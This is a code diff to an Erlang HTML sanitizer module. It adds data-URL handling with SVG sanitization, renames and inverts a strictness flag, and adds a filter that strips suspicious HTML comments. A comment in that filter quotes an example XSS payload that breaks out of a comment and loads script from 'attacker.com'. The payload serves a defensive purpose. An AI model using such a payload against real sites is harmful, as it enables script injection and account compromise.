@@ -1,9 +1,19 @@
 %% @author Marc Worrell <marc@worrell.nl>
-%% @copyright 2009-2024 Marc Worrell
-%% @doc Utility functions for html processing.  Also used for property filtering (by m_rsc_update).
+%% @copyright 2009-2025 Marc Worrell
+%% @doc Utility functions sanitizing, escaping and filtering HTML, and sanitize property lists/maps.
+%%
+%% Utiliy functions to:
+%%
+%% - Sanitize HTML texts
+%% - Truncate HTML, whilst ensuring that opened tags are properly closed.
+%% - Escape and unescape HTML texts
+%% - Newline to br-tag mapping (and vice versa)
+%% - Stripping HTML tags from a text
+%% - Sanitize nested property lists/maps, using type hints from the property names.
+%% - Make relative URLs absolute based on a base URL.
 %% @end
 
-%% Copyright 2009-2024 Marc Worrell
+%% Copyright 2009-2025 Marc Worrell
 %%
 %% Licensed under the Apache License, Version 2.0 (the "License");
 %% you may not use this file except in compliance with the License.
@@ -38,6 +48,7 @@
     noscript/1,
     noscript/2,
     sanitize_uri/1,
+    sanitize_uri/2,
     escape_link/1,
     nl2br/1,
     br2nl/1,
@@ -211,6 +222,8 @@ sanitize_type(_, _Ks, V, _Options) -> escape_value(V).
 sanitize_list(Ks, L, Options) when is_list(L) ->
     lists:filtermap(
         fun
+            ({trans, Tr} = V) when is_list(Tr) ->
+                escape(V);
             ({P, V}) ->
                 P1 = z_convert:to_binary(P),
                 V1 = escape_props1(P1, V, Options),
@@ -355,6 +368,8 @@ sanitize_type_check(_, V, _Options) -> escape_value_check(V).
 sanitize_list_check(L, Options) when is_list(L) ->
     lists:filtermap(
         fun
+            ({trans, Tr} = V) when is_list(Tr) ->
+                escape_check(V);
             ({P, V}) ->
                 P1 = z_convert:to_binary(P),
                 V1 = escape_props_check1(P1, V, Options),
@@ -628,7 +643,7 @@ escape_link(Text) ->
 make_link(B) when is_binary(B) ->
     escape(B);
 make_link({link, Link}) ->
-    NoScript = noscript(Link, true),
+    NoScript = noscript(Link, false),
     LinkText = escape(NoScript),
     LinkUrl = escape(ensure_protocol(NoScript)),
     <<
@@ -674,33 +689,50 @@ ensure_protocol(Link) when is_binary(Link) ->
 
 %% @doc Ensure that an uri is (quite) harmless by removing any script reference
 -spec sanitize_uri( maybe_iodata() ) -> maybe_binary().
-sanitize_uri(undefined) ->
-    undefined;
-sanitize_uri(<<>>) ->
-    <<>>;
-sanitize_uri([]) ->
-    <<>>;
-sanitize_uri(Uri) ->
-    B = iolist_to_binary(ensure_protocol(noscript(z_string:trim(Uri), true))),
-    cleanup_uri_chars(B, <<>>).
+sanitize_uri(MaybeUrl) ->
+    sanitize_uri(MaybeUrl, true).
 
-cleanup_uri_chars(<<>>, Acc) -> 
+%% @doc Ensure that an uri is (quite) harmless by removing any script reference. Option
+%% to allow 'data:' urls. Data urls are only passed if their mime type is denotes an image,
+%% video, or plain-text. SVGs will be sanitized.
+-spec sanitize_uri(MaybeUrl, IsAllowData) -> maybe_binary() when
+    MaybeUrl :: maybe_iodata(),
+    IsAllowData :: boolean().
+sanitize_uri(undefined, _IsAllowData) ->
+    undefined;
+sanitize_uri(<<>>, _IsAllowData) ->
+    <<>>;
+sanitize_uri([], _IsAllowData) ->
+    <<>>;
+sanitize_uri(Uri, IsAllowData) ->
+    case iolist_to_binary(ensure_protocol(noscript(z_string:trim(Uri), IsAllowData))) of
+        <<"data:", _/binary>> = Uri1 ->
+            cleanup_uri_chars(Uri1, data, <<>>);
+        Uri1 ->
+            cleanup_uri_chars(Uri1, url, <<>>)
+    end.
+
+
+cleanup_uri_chars(<<>>, _Mode, Acc) ->
     Acc;
-cleanup_uri_chars(<<$%, A, B, C/binary>>, Acc)
+cleanup_uri_chars(<<$%, A, B, C/binary>>, Mode, Acc)
     when      ((A >= $0 andalso A =< $9) orelse (A >= $A andalso A =< $Z))
       andalso ((B >= $0 andalso B =< $9) orelse (B >= $A andalso B =< $Z)) ->
-    cleanup_uri_chars(C, <<Acc/binary, $%, A, B>>);
-cleanup_uri_chars(<<C, B/binary>>, Acc)
-    when C =:= $.; C =:= $&; C =:= $:; C =:= $/; 
+    cleanup_uri_chars(C, Mode, <<Acc/binary, $%, A, B>>);
+cleanup_uri_chars(<<C, B/binary>>, Mode, Acc)
+    when C =:= $.; C =:= $&; C =:= $:; C =:= $/;
          C =:= $=; C =:= $?; C =:= $#; C =:= $+ ->
-    cleanup_uri_chars(B, <<Acc/binary, C>>);
-cleanup_uri_chars(<<C, B/binary>>, Acc) ->
+    cleanup_uri_chars(B, Mode, <<Acc/binary, C>>);
+cleanup_uri_chars(<<C, B/binary>>, data, Acc)
+    when C =:= $,; C =:= $; ->
+    cleanup_uri_chars(B, data, <<Acc/binary, C>>);
+cleanup_uri_chars(<<C, B/binary>>, Mode, Acc) ->
     case z_url:url_unreserved_char(C) of
         false ->
             C1 = iolist_to_binary(z_url:hex_encode([C])),
-            cleanup_uri_chars(B, <<Acc/binary, $%, C1/binary>>);
+            cleanup_uri_chars(B, Mode, <<Acc/binary, $%, C1/binary>>);
         true ->
-            cleanup_uri_chars(B, <<Acc/binary, C>>)
+            cleanup_uri_chars(B, Mode, <<Acc/binary, C>>)
     end.
 
 %% @doc Strip all html elements from the text. Simple parsing is applied to find the elements.
@@ -972,7 +1004,7 @@ sanitize({Elt,Attrs,Enclosed}, Stack, ExtraElts, ExtraAttrs, Options) ->
     end.
 
 sanitize_element(Element, Stack, Options) ->
-    Callback = proplists:get_value(element, Options, fun(E) -> E end),
+    Callback = proplists:get_value(element, Options, fun sanitize_element_int/1),
     sanitize_element(Callback, Element, Stack, Options).
 
 sanitize_element(F, Element, _Stack, _Options) when is_function(F, 1) ->
@@ -984,6 +1016,15 @@ sanitize_element(F, Element, Stack, Options) when is_function(F, 3) ->
 sanitize_element({M, F, A}, Element, Stack, _Options) ->
     erlang:apply(M, F, [Element, Stack|A]).
 
+sanitize_element_int({comment, Comment} = E) ->
+    % Remove comments that might contain injections for e.g. html editors.
+    % For example: <!--data-mce-selected="x"->"><img src onerror=import('//attacker.com')>-->
+    case binary:match(Comment, [ <<"<">>, <<">">> ]) of
+        nomatch -> E;
+        _ -> <<>>
+    end;
+sanitize_element_int(E) ->
+    E.
 
 %% @doc Flatten the sanitized html tree to a binary - the attributes are already filtered
 %% using the allow_attr/1 whitelist.
@@ -1054,10 +1095,10 @@ sanitize_attr_value(<<"class">>, V) ->
     % Remove all do_xxxx widget manager classes
     filter_widget_class(V);
 sanitize_attr_value(<<"href">>, V) ->
-    noscript(V, true);
+    noscript(V, false);
 sanitize_attr_value(Attr, V) ->
     case is_url_attr(Attr) of
-        true -> noscript(V, false);
+        true -> noscript(V, true);
         false -> V
     end.
 
@@ -1256,25 +1297,25 @@ filter_widget_class(Class) ->
     Url :: string() | binary(),
     SafeUrl :: binary().
 noscript(Url) ->
-    noscript(Url, true).
+    noscript(Url, false).
 
 %% @doc Filter an url, if strict then also remove "data:" (as data can be text/html).
--spec noscript(Url, IsStrict) -> SafeUrl when
+-spec noscript(Url, IsAllowData) -> SafeUrl when
     Url :: string() |  binary(),
-    IsStrict :: boolean(),
+    IsAllowData :: boolean(),
     SafeUrl :: binary().
-noscript(Url0, IsStrict) ->
+noscript(Url0, IsAllowData) ->
     Url = z_string:trim(z_string:sanitize_utf8(z_convert:to_binary(Url0))),
-    case nows(Url, <<>>) of
+    case nows_protocol_split(Url, <<>>) of
         {<<"javascript">>, _} -> <<"#script-removed">>;
         {<<"script">>, _} -> <<"#script-removed">>;
         {<<"vbscript">>, _} -> <<"#script-removed">>;
-        {<<"data">>, _} when IsStrict -> <<>>;
-        {<<"data">>, Data} ->
+        {<<"data">>, Data} when IsAllowData ->
             case noscript_data(Data) of
                 <<>> -> <<>>;
                 Data1 -> <<"data:", Data1/binary>>
             end;
+        {<<"data">>, _} -> <<>>;
         {<<"mailto">>, Rest} -> <<"mailto:", (z_string:trim(Rest))/binary>>;
         {Protocol, Rest} when is_binary(Protocol) -> <<Protocol/binary, $:, Rest/binary>>;
         {undefined, <<>>} -> <<>>;
@@ -1283,35 +1324,42 @@ noscript(Url0, IsStrict) ->
 
 %% @doc Remove whitespace and make lowercase till we find a colon, slash or pound-sign. Also
 %% deletes all invalid utf8 characters.
--spec nows( binary(), binary() ) -> {binary()|undefined, binary()}.
-nows(<<>>, Acc) -> {undefined, Acc};
-nows(<<$:, Rest/binary>>, Acc) -> {Acc, Rest};
-nows(<<$/, Rest/binary>>, Acc) -> {undefined, <<Acc/binary, $/, Rest/binary>>};
-nows(<<$#, Rest/binary>>, Acc) -> {undefined, <<Acc/binary, $#, Rest/binary>>};
-nows(<<$\\, Rest/binary>>, Acc) -> nows(Rest, Acc);
-nows(<<$%, A, B, Rest/binary>>, Acc) ->
+-spec nows_protocol_split( binary(), binary() ) -> {binary()|undefined, binary()}.
+nows_protocol_split(<<>>, Acc) -> {undefined, Acc};
+nows_protocol_split(<<$:, Rest/binary>>, Acc) -> {Acc, Rest};
+nows_protocol_split(<<$/, Rest/binary>>, Acc) -> {undefined, <<Acc/binary, $/, Rest/binary>>};
+nows_protocol_split(<<$#, Rest/binary>>, Acc) -> {undefined, <<Acc/binary, $#, Rest/binary>>};
+nows_protocol_split(<<$\\, Rest/binary>>, Acc) -> nows_protocol_split(Rest, Acc);
+nows_protocol_split(<<$%, A, B, Rest/binary>>, Acc) ->
     case catch erlang:binary_to_integer(<<A, B>>, 16) of
-        V when is_integer(V) -> nows(<<V, Rest/binary>>, Acc);
+        V when is_integer(V) -> nows_protocol_split(<<V, Rest/binary>>, Acc);
         _ -> {undefined, <<>>}
     end;
-nows(<<$%, _/binary>>, _Acc) ->
+nows_protocol_split(<<$%, _/binary>>, _Acc) ->
     % Illegal: not enough characters left for escape sequence
     {undefined, <<>>};
-nows(<<C, Rest/binary>>, Acc) when C =< 32 ->
+nows_protocol_split(<<C, Rest/binary>>, Acc) when C =< 32 ->
     % Discard control characters
-    nows(Rest, Acc);
-nows(<<C, Rest/binary>>, Acc) when C >= $A, C =< $Z ->
+    nows_protocol_split(Rest, Acc);
+nows_protocol_split(<<C, Rest/binary>>, Acc) when C >= $A, C =< $Z ->
     % Ensure lowercase a-z
-    nows(Rest, <<Acc/binary, (C+32)>>);
-nows(<<C/utf8, Rest/binary>>, Acc) ->
-    nows(Rest, <<Acc/binary, C/utf8>>);
-nows(<<_, Rest/binary>>, Acc) ->
+    nows_protocol_split(Rest, <<Acc/binary, (C+32)>>);
+nows_protocol_split(<<C/utf8, Rest/binary>>, Acc) ->
+    nows_protocol_split(Rest, <<Acc/binary, C/utf8>>);
+nows_protocol_split(<<_, Rest/binary>>, Acc) ->
     % Discard non utf8 characters
-    nows(Rest, Acc).
+    nows_protocol_split(Rest, Acc).
 
 %% @doc Sanitize the data link, drop anything suspected to be a script, or that could contain a script.
-%% @todo Parse SVG with the svg sanitizer
-noscript_data(<<"image/svg", _/binary>>) -> <<>>;
+noscript_data(<<"image/svg", _/binary>> = Url) ->
+    Url1 = <<"data:", Url/binary>>,
+    case z_url:decode_data_url(Url1) of
+        {ok, Mime, _Charset, Decoded} ->
+            Sanitized = z_svg:sanitize(Decoded),
+            <<Mime/binary, ";base64,", (base64:encode(Sanitized))/binary>>;
+        {error, _} ->
+            <<>>
+    end;
 noscript_data(<<"image/", _/binary>> = Data) -> Data;
 noscript_data(<<"audio/", _/binary>> = Data) -> Data;
 noscript_data(<<"video/", _/binary>> = Data) -> Data;
